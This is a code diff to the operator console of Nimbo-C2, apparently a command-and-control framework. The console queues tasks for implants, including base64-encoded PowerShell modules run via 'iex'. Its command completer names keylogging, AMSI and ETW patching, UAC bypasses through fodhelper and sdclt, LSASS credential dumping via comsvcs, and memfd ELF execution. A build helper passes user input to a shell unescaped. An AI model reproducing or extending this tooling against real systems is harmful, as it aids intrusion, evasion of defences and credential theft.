@@ -6,9 +6,7 @@ import os
 import re
 import json
 import shlex
-import random
 import subprocess
-from textwrap import indent
 from tabulate import tabulate
 from collections import OrderedDict
 from jsonc_parser.parser import JsoncParser
@@ -77,17 +75,6 @@ agent_prompt_text = FormattedText([(f"fg:{nimbo_prompt_color}", "Nimbo-C2 "),
                                    (f"fg:{agent_prompt_color}", "[AGENT-ID]"), ("", " > ")])
 
 
-def provide_ps_module(ps_module):
-    powershell_command = getattr(ps_modules, ps_module)
-    encoded_powershell_command = utils.encode_base_64(powershell_command)
-    command_dict = {
-        "command_type": "iex",
-        "ps_module": ps_module,
-        "encoded_powershell_command": encoded_powershell_command
-    }
-    return command_dict
-
-
 command_registry = OrderedDict()
 
 
@@ -103,6 +90,17 @@ class Command:
 
     def run(self, *args):
         return self.handler(*args)
+
+
+def provide_ps_module(ps_module):
+    powershell_command = getattr(ps_modules, ps_module)
+    encoded_powershell_command = utils.encode_base_64(powershell_command)
+    command_dict = {
+        "command_type": "iex",
+        "ps_module": ps_module,
+        "encoded_powershell_command": encoded_powershell_command
+    }
+    return command_dict
 
 
 def register_command(name, help, category, target, autocomplete_args=None, elevated=False):
@@ -309,8 +307,8 @@ def handler_critical(critical_flag, command_dict):
 
 @register_command("sleep", "Change sleep time interval and jitter", "Communication Stuff", "All", ["<sleep-time>", "<jitter-%>"])
 def handler_sleep(sleep_time, jitter, command_dict):
-    command_dict["sleep"] = sleep_time
-    command_dict["jitter"] = jitter
+    command_dict["sleep"] = int(sleep_time)
+    command_dict["jitter"] = int(jitter)
     return command_dict
 
 @register_command("collect", "Recollect agent data", "Communication Stuff", "All")
@@ -333,12 +331,19 @@ def handler_memfd(mode, elf_path, commandline, command_dict):
     return command_dict
 
 
+def enrich_agent_completer_dict(commands_dict):
+    # function to enrich the agent completer
+    commands_dict["keylog"] = dict.fromkeys(['start', 'dump','stop'])
+    commands_dict["patch"] = dict.fromkeys(['amsi', 'etw'])
+    commands_dict["uac"] = dict.fromkeys(['fodhelper', 'sdclt'])
+    commands_dict["lsass"] = dict.fromkeys(['examine', 'direct', 'comsvcs', 'eviltwin'])
+    commands_dict["critical"] = dict.fromkeys(['true', 'false'])
+    commands_dict["patch"] = dict.fromkeys(['task', 'implant'])
+    return commands_dict
+
+
 def list_all_commands(target: str = "All"):
-    """
-    Returns a list of command names filtered by elevation and target OS.
-    :param is_elevated: Whether to include elevated-only commands.
-    :param target: One of "Windows", "Linux", or None for all.
-    """
+
     target = target.lower() if target else None
 
     return [
@@ -353,7 +358,7 @@ def list_all_commands(target: str = "All"):
     ]
 
 
-def print_help(target: str = "All"):
+def print_agent_help(target: str = "All"):
     
     CATEGORY_ORDER = [
         "Send Commands",
@@ -370,10 +375,8 @@ def print_help(target: str = "All"):
         "Communication Stuff"
     ]
 
-    # Normalize the input
     target = target.lower()
 
-    # Group commands by category in defined order
     categorized = OrderedDict((cat, []) for cat in CATEGORY_ORDER)
 
     for name, cmd in command_registry.items():
@@ -396,6 +399,20 @@ def print_help(target: str = "All"):
             padding = " " * max(1, 50 - len(cmd.name + " " + args))
             print(f"    {cmd.name} {args}{padding}->  {cmd.help}")
         print()
+
+
+def print_agent_help_general():
+    agent_help_general = """
+    --== General (Server only) ==--
+    show                                              ->  Show agent details
+    clear                                             ->  Clear pending tasks
+    cls                                               ->  Clear the screen
+    back                                              ->  Back to main screen
+    help                                              ->  Print this help message
+    exit                                              ->  Exit Nimbo-C2
+    ! <command>                                       ->  Execute system command
+    """
+    print(agent_help_general)
 
 
 def print_main_help():
@@ -456,6 +473,14 @@ def exit_nimbo():
     exit()
 
 
+def send_build_command(build_params):
+    build_command = "python3 builder/build.py " + build_params
+    try:    
+        subprocess.run(build_command, shell=True)
+    except:
+        utils.log_message(f"[-] Stopping build", print_time=False)
+
+
 def parse_common_command(command):
     if re.fullmatch(r"\s*cls\s*", command):
         utils.clear_screen()
@@ -464,16 +489,16 @@ def parse_common_command(command):
     elif re.fullmatch(r"\s*exit\s*", command):
         raise KeyboardInterrupt
 
-    elif re.fullmatch(r"\s*!.*", command):
-        shell_command = re.sub(r"\s*!", "", command, 1)
-        os.system(shell_command)
-        return True
-
     elif re.fullmatch(r"\s*build\s+.*", command):
         build_params = re.sub(r"\s*build\s+", "", command, 1)
         send_build_command(build_params)
         return True
-        
+
+    elif re.fullmatch(r"\s*!.*", command):
+        shell_command = re.sub(r"\s*!", "", command, 1)
+        os.system(shell_command)
+        return True
+ 
     elif re.fullmatch(r"\s*", command):
         return True
 
@@ -483,9 +508,11 @@ def parse_common_command(command):
 
 def agent_screen(agent_id, os):
 
+
     agent_commands = list_all_commands(target=os)
-    agent_commands.extend(["clear", "show", "back", "help"])
+    agent_commands.extend(["clear", "show", "back", "help", "cls", "exit"])
     agent_completer_dict = {cmd: None for cmd in agent_commands}
+    agent_completer_dict = enrich_agent_completer_dict(agent_completer_dict)
     agent_completer = NestedCompleter.from_nested_dict(agent_completer_dict)
 
     while True:
@@ -509,7 +536,8 @@ def agent_screen(agent_id, os):
                 return
 
             elif re.fullmatch(r"\s*help\s*", command):
-                print_help(target=os)
+                print_agent_help(target=os)
+                print_agent_help_general()
                 continue
             
             elif parse_common_command(command):
@@ -521,21 +549,12 @@ def agent_screen(agent_id, os):
             if command:
                 command_dict = command.handler(*command_list[1:])
                 listener.agents[agent_id]["pending_commands"] += [command_dict]
-                print(command_dict)
             else:
                 raise Exception
 
         except Exception:
             print("[-] Could not parse command")
             continue
-
-
-def send_build_command(build_params):
-    build_command = "python3 builder/build.py " + build_params
-    try:    
-        subprocess.run(build_command, shell=True)
-    except:
-        utils.log_message(f"[-] Stopping build", print_time=False)
 
 
 def main_screen():
